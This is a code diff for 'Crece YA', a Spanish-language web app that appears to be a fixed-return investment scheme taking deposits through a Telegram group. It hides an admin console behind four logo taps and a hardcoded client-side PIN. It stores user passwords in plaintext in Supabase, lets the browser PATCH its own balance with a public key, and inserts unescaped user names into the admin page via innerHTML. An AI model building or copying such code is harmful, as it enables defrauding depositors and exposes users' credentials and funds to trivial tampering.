@@ -335,7 +335,7 @@
       </div>
     </div>
 
-    <!-- NAVEGACIÓN -->
+    <!-- BARRA INFERIOR -->
     <nav class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-sm bg-white/95 backdrop-blur-md border-t border-sky-200 grid grid-cols-4 py-2 px-2 text-center text-xs z-40 gap-1 shadow-lg">
       <button onclick="switchTab('planes')" id="nav-btn-planes" class="bg-sky-600 text-white py-2 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition">
         <i class="fa-solid fa-chart-pie text-sm"></i>
@@ -409,7 +409,7 @@
           </div>
 
           <div>
-            <input id="deposit-custom-input" type="number" min="2000" placeholder="Ingrese un monto personalizado (mín. 2.000,00)" class="w-full bg-[#132337] border border-slate-800 rounded-xl p-3 text-xs font-mono font-bold text-white outline-none">
+            <input id="deposit-custom-input" type="number" min="2000" value="2000" placeholder="Ingrese un monto personalizado (mín. 2.000,00)" class="w-full bg-[#132337] border border-slate-800 rounded-xl p-3 text-xs font-mono font-bold text-white outline-none">
           </div>
 
           <button onclick="notifyDepositTelegram()" class="w-full py-3 bg-sky-500 hover:bg-sky-400 text-slate-950 font-black text-xs rounded-xl transition shadow flex items-center justify-center gap-2">
@@ -458,54 +458,37 @@
       </div>
     </div>
 
-    <!-- MODAL ADMIN -->
-    <div id="admin-modal" class="fixed inset-0 z-50 bg-black/85 backdrop-blur-xs hidden flex items-center justify-center p-4">
-      <div class="bg-white border border-amber-400 w-full max-w-sm rounded-3xl p-5 shadow-2xl space-y-4">
-        <div class="flex items-center justify-between border-b pb-2">
-          <h3 class="text-sm font-bold text-amber-600 flex items-center gap-1.5">
-            <i class="fa-solid fa-lock"></i> Panel Administrativo Central
+    <!-- ================= MODAL ADMIN CENTRAL (DISEÑO EXACTO A TU CAPTURA) ================= -->
+    <div id="admin-modal" class="fixed inset-0 z-50 bg-[#06040d]/90 backdrop-blur-md hidden flex items-center justify-center p-4">
+      <div class="bg-[#0f091c] border border-purple-900/60 w-full max-w-sm rounded-3xl p-5 shadow-2xl space-y-4 max-h-[85vh] flex flex-col">
+        
+        <div class="flex items-center justify-between border-b border-purple-950 pb-2.5">
+          <h3 class="text-sm font-bold text-amber-400 flex items-center gap-2">
+            <i class="fa-solid fa-user-shield"></i> Consola Central Crece YA
           </h3>
-          <button onclick="closeAdminModal()" class="text-slate-400 hover:text-slate-700">
+          <button onclick="closeAdminModal()" class="text-slate-400 hover:text-white">
             <i class="fa-solid fa-xmark text-base"></i>
           </button>
         </div>
 
         <div id="admin-auth-box" class="space-y-3">
-          <label class="text-xs text-slate-400 block">INGRESA LA CLAVE MAESTRA</label>
-          <input id="admin-pin-input" type="password" maxlength="6" placeholder="••••••" class="w-full bg-slate-50 border border-slate-200 rounded-xl p-2.5 text-center text-base font-mono tracking-widest outline-none">
-          <button id="btn-admin-unlock" class="w-full py-2.5 bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs rounded-xl transition">
+          <label class="text-xs text-purple-300/80 block">INGRESA LA CLAVE MAESTRA</label>
+          <input id="admin-pin-input" type="password" maxlength="6" placeholder="••••••" class="w-full bg-[#18112b] border border-purple-900/80 rounded-xl p-2.5 text-center text-base font-mono tracking-widest text-amber-400 outline-none">
+          <button id="btn-admin-unlock" class="w-full py-2.5 bg-amber-400 hover:bg-amber-300 text-slate-950 font-extrabold text-xs rounded-xl transition">
             Desbloquear
           </button>
         </div>
 
-        <div id="admin-dashboard-box" class="hidden space-y-3 text-xs">
-          <div class="p-3 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
-            <span class="font-bold text-slate-800 block text-xs">Aprobar Recarga Manual</span>
-            <div class="flex gap-2">
-              <input id="admin-credit-amount" type="number" value="2000" class="w-full bg-white border border-slate-200 rounded-lg p-2 font-mono text-xs font-bold">
-              <button id="btn-admin-credit" class="px-3.5 bg-emerald-500 hover:bg-emerald-600 text-white font-bold rounded-lg text-xs shrink-0">
-                Acreditar
-              </button>
-            </div>
-          </div>
-
-          <div class="p-3 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
-            <span class="font-bold text-slate-800 block text-xs">Validación de Invitado</span>
-            <button id="btn-admin-validate-guest" class="w-full py-2.5 bg-sky-600 hover:bg-sky-700 text-white font-bold rounded-lg text-xs">
-              Validar 1er Depósito de Invitado
+        <div id="admin-dashboard-box" class="hidden flex-1 flex flex-col space-y-3 overflow-hidden">
+          <div class="flex justify-between items-center text-xs">
+            <span class="font-bold text-white">Depósitos Pendientes en Vivo</span>
+            <button onclick="cargarSolicitudesAdmin()" class="text-amber-400 hover:underline flex items-center gap-1 font-mono">
+              <i class="fa-solid fa-rotate-right"></i> Refrescar
             </button>
           </div>
 
-          <div class="p-3 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
-            <span class="font-bold text-slate-800 block text-xs">Gestión de Retiros</span>
-            <div class="grid grid-cols-2 gap-2">
-              <button id="btn-admin-liquidate-w" class="py-2 bg-emerald-500 hover:bg-emerald-600 text-white font-bold rounded-lg text-xs">
-                Liquidar Retiro
-              </button>
-              <button id="btn-admin-reject-w" class="py-2 bg-rose-500 hover:bg-rose-600 text-white font-bold rounded-lg text-xs">
-                Rechazar (Reintegro)
-              </button>
-            </div>
+          <div id="admin-deposits-list" class="space-y-3 overflow-y-auto pr-1 flex-1">
+            <p class="text-[11px] text-slate-500 text-center py-6">Cargando solicitudes...</p>
           </div>
         </div>
       </div>
@@ -513,32 +496,26 @@
 
   </main>
 
-  <!-- LÓGICA JAVASCRIPT CONEXIÓN EXACTA A SUPABASE -->
+  <!-- LÓGICA JAVASCRIPT -->
   <script>
     const SUPABASE_API_URL = "https://jsixgpftuhtepudyektf.supabase.co/rest/v1";
     const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
 
-    // Función que envía datos a Supabase sin trabar la interfaz
-    async function syncUserToSupabase(userData) {
+    async function supabaseRequest(endpoint, method = 'GET', body = null) {
+      const headers = {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_PUBLISHABLE_KEY,
+        'Authorization': `Bearer ${SUPABASE_PUBLISHABLE_KEY}`,
+        'Prefer': 'resolution=merge-duplicates,return=representation'
+      };
+      const options = { method, headers };
+      if (body) options.body = JSON.stringify(body);
       try {
-        const response = await fetch(`${SUPABASE_API_URL}/usuarios`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'apikey': SUPABASE_PUBLISHABLE_KEY,
-            'Authorization': `Bearer ${SUPABASE_PUBLISHABLE_KEY}`,
-            'Prefer': 'resolution=merge-duplicates'
-          },
-          body: JSON.stringify(userData)
-        });
-        if (response.ok) {
-          console.log("Usuario sincronizado exitosamente con Supabase");
-        } else {
-          const errText = await response.text();
-          console.warn("Respuesta Supabase:", errText);
-        }
-      } catch (err) {
-        console.warn("Fallo de red al sincronizar con Supabase:", err);
+        const res = await fetch(`${SUPABASE_API_URL}/${endpoint}`, options);
+        return await res.json();
+      } catch (e) {
+        console.warn("Supabase error:", e);
+        return null;
       }
     }
 
@@ -639,6 +616,7 @@
       if (appState.phone && appState.pass) {
         if (authScreen) authScreen.remove();
         document.getElementById('user-display-phone').innerText = appState.phone;
+        sincronizarSaldoServidor();
         renderUI();
       } else {
         generateCaptcha();
@@ -646,7 +624,19 @@
       }
     }
 
-    // ACCESO INMEDIATO SIN CONFLICTOS + REGISTRO SEGURO EN SUPABASE
+    // Traer el saldo actualizado desde Supabase por si el admin aprobó una recarga
+    async function sincronizarSaldoServidor() {
+      if (!appState.phone) return;
+      const data = await supabaseRequest(`usuarios?phone=eq.${appState.phone}&select=*`);
+      if (data && data.length > 0) {
+        appState.balance = parseFloat(data[0].balance) || 0;
+        appState.name = data[0].name || appState.name;
+        appState.cvu = data[0].cvu || appState.cvu;
+        appState.alias = data[0].alias || appState.alias;
+        saveLocal();
+      }
+    }
+
     window.handleLoginDirecto = function() {
       const phoneInput = document.getElementById('auth-phone');
       const passInput = document.getElementById('auth-pass');
@@ -673,16 +663,13 @@
       appState.pass = pass;
       saveLocal();
 
-      // 1. Destruir la pantalla de acceso en el acto
       const authScreen = document.getElementById('auth-screen');
-      if (authScreen) {
-        authScreen.remove();
-      }
+      if (authScreen) authScreen.remove();
       document.getElementById('user-display-phone').innerText = appState.phone;
       renderUI();
 
-      // 2. Guardar en Supabase en segundo plano con la clave correcta
-      syncUserToSupabase({
+      // Enviar a Supabase
+      supabaseRequest('usuarios', 'POST', {
         phone: phone,
         pass: pass,
         name: appState.name || '',
@@ -796,6 +783,7 @@
           });
 
           saveLocal();
+          supabaseRequest(`usuarios?phone=eq.${appState.phone}`, 'PATCH', { balance: appState.balance });
           alert(`¡Plan activado con éxito! Monitorea el conteo en "Productos".`);
           switchTab('productos');
         }
@@ -830,6 +818,7 @@
           appState.balance += plan.total;
           appState.activePlans.splice(index, 1);
           saveLocal();
+          supabaseRequest(`usuarios?phone=eq.${appState.phone}`, 'PATCH', { balance: appState.balance });
           alert(`¡Ciclo culminado! Se acreditaron $${fmt(plan.total)} ARS a tu balance.`);
           return;
         }
@@ -879,6 +868,7 @@
       appState.balance += 500;
       appState.lastClaim = now;
       saveLocal();
+      supabaseRequest(`usuarios?phone=eq.${appState.phone}`, 'PATCH', { balance: appState.balance });
       alert("¡+$500 ARS acreditados!");
     });
 
@@ -917,7 +907,8 @@
 
     window.setDepositValue = (v) => document.getElementById('deposit-custom-input').value = v;
 
-    window.notifyDepositTelegram = function() {
+    // REGISTRAR SOLICITUD EN SUPABASE Y ABRIR TELEGRAM
+    window.notifyDepositTelegram = async function() {
       const val = parseFloat(document.getElementById('deposit-custom-input').value) || 2000;
       if (val < 2000) {
         alert("El monto mínimo de recarga es de $2.000 ARS.");
@@ -925,6 +916,15 @@
       }
       appState.pending += val;
       saveLocal();
+
+      // Guardar en la tabla solicitudes de Supabase
+      await supabaseRequest('solicitudes', 'POST', {
+        user_phone: appState.phone,
+        user_name: appState.name || 'Usuario Crece YA',
+        amount: val,
+        status: 'pendiente'
+      });
+
       window.open('https://t.me/+gROOyK5OfpI5MTQx', '_blank');
       closeWalletModal();
     };
@@ -967,6 +967,7 @@
       appState.balance -= amt;
       appState.lastWithdraw = now;
       saveLocal();
+      supabaseRequest(`usuarios?phone=eq.${appState.phone}`, 'PATCH', { balance: appState.balance });
       alert("Solicitud de retiro registrada. Procesando en horario bancario.");
       closeWalletModal();
     };
@@ -993,21 +994,17 @@
       appState.alias = document.getElementById('prof-alias-input').value.trim();
       saveLocal();
 
-      // Actualizar datos bancarios en Supabase
       if (appState.phone) {
-        syncUserToSupabase({
-          phone: appState.phone,
-          pass: appState.pass,
+        supabaseRequest(`usuarios?phone=eq.${appState.phone}`, 'PATCH', {
           name: appState.name,
           cvu: appState.cvu,
-          alias: appState.alias,
-          balance: appState.balance
+          alias: appState.alias
         });
       }
-
       alert("Datos bancarios guardados.");
     });
 
+    // ================= DETECTOR 4 TOQUES EN EL LOGO =================
     let logoClicks = 0;
     document.getElementById('admin-logo-trigger').addEventListener('click', () => {
       logoClicks++;
@@ -1023,59 +1020,76 @@
       if (document.getElementById('admin-pin-input').value === "161928") {
         document.getElementById('admin-auth-box').classList.add('hidden');
         document.getElementById('admin-dashboard-box').classList.remove('hidden');
+        cargarSolicitudesAdmin();
       } else {
         alert("Clave maestra incorrecta.");
       }
     });
 
-    document.getElementById('btn-admin-credit').addEventListener('click', () => {
-      const amt = parseFloat(document.getElementById('admin-credit-amount').value) || 0;
-      if (amt <= 0) return;
-      appState.balance += amt;
-      if (appState.pending >= amt) appState.pending -= amt;
-      saveLocal();
+    // ================= CARGA DE TARJETAS IDÉNTICAS A LA 2DA IMAGEN =================
+    window.cargarSolicitudesAdmin = async function() {
+      const container = document.getElementById('admin-deposits-list');
+      container.innerHTML = '<p class="text-xs text-purple-300 text-center py-6">Consultando solicitudes en Supabase...</p>';
 
-      if (appState.phone) {
-        syncUserToSupabase({
-          phone: appState.phone,
-          pass: appState.pass,
-          balance: appState.balance
-        });
+      const data = await supabaseRequest('solicitudes?status=eq.pendiente&order=id.desc');
+
+      if (!data || data.length === 0) {
+        container.innerHTML = '<p class="text-xs text-slate-400 text-center py-8">No hay depósitos pendientes por aprobar.</p>';
+        return;
       }
 
-      alert(`$${fmt(amt)} ARS acreditados.`);
-      closeAdminModal();
-    });
+      container.innerHTML = data.map(item => {
+        const timeStr = new Date(item.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+        return `
+          <div class="p-3.5 rounded-2xl bg-[#17102a] border border-purple-900/60 shadow-md space-y-2.5">
+            <div class="flex justify-between items-start">
+              <div>
+                <h4 class="font-bold text-white text-xs leading-tight">${item.user_name || 'Usuario'}</h4>
+                <span class="text-[11px] text-purple-300 font-mono block mt-0.5">${item.user_phone}</span>
+              </div>
+              <span class="font-bold text-amber-400 font-mono text-sm">$${fmt(item.amount)} ARS</span>
+            </div>
 
-    document.getElementById('btn-admin-validate-guest').addEventListener('click', () => {
-      appState.balance += 1000;
-      saveLocal();
+            <div class="flex justify-between items-center text-[10px] text-purple-400/80 font-mono">
+              <span>Transferencia Bancaria</span>
+              <span>${timeStr}</span>
+            </div>
 
-      if (appState.phone) {
-        syncUserToSupabase({
-          phone: appState.phone,
-          pass: appState.pass,
-          balance: appState.balance
-        });
+            <button onclick="aprobarDeposito('${item.id}', '${item.user_phone}', ${item.amount})" class="w-full py-2.5 bg-amber-400 hover:bg-amber-300 text-slate-950 font-black text-xs rounded-xl transition shadow">
+              Aprobar y Acreditar Saldo
+            </button>
+          </div>
+        `;
+      }).join('');
+    };
+
+    // APROBACIÓN DIRECTA: Actualiza Supabase y acredita el saldo de inmediato
+    window.aprobarDeposito = async function(solicitudId, phone, amount) {
+      if (!confirm(`¿Confirmas acreditar $${fmt(amount)} ARS a ${phone}?`)) return;
+
+      // 1. Obtener saldo actual del usuario en Supabase
+      const users = await supabaseRequest(`usuarios?phone=eq.${phone}&select=balance`);
+      let saldoActual = 0;
+      if (users && users.length > 0) saldoActual = parseFloat(users[0].balance) || 0;
+
+      const nuevoSaldo = saldoActual + parseFloat(amount);
+
+      // 2. Acreditar saldo en Supabase
+      await supabaseRequest(`usuarios?phone=eq.${phone}`, 'PATCH', { balance: nuevoSaldo });
+
+      // 3. Marcar la solicitud como aprobada
+      await supabaseRequest(`solicitudes?id=eq.${solicitudId}`, 'PATCH', { status: 'aprobado' });
+
+      // Si el teléfono coincide con el del dispositivo actual, actualizar la pantalla local
+      if (appState.phone === phone) {
+        appState.balance = nuevoSaldo;
+        if (appState.pending >= amount) appState.pending -= amount;
+        saveLocal();
       }
 
-      alert("Invitado validado (+ $1.000 ARS).");
-      closeAdminModal();
-    });
-
-    document.getElementById('btn-admin-liquidate-w').addEventListener('click', () => {
-      appState.withdrawn += 5000;
-      saveLocal();
-      alert("Retiro liquidado.");
-      closeAdminModal();
-    });
-
-    document.getElementById('btn-admin-reject-w').addEventListener('click', () => {
-      appState.balance += 5000;
-      saveLocal();
-      alert("Retiro rechazado. Fondos reintegrados.");
-      closeAdminModal();
-    });
+      alert(`¡Aprobado! Se acreditaron $${fmt(amount)} ARS a ${phone}.`);
+      cargarSolicitudesAdmin();
+    };
 
     function renderUI() {
       document.getElementById('home-balance-display').innerHTML = `$${fmt(appState.balance)} <span class="text-sm font-normal text-slate-400">ARS</span>`;
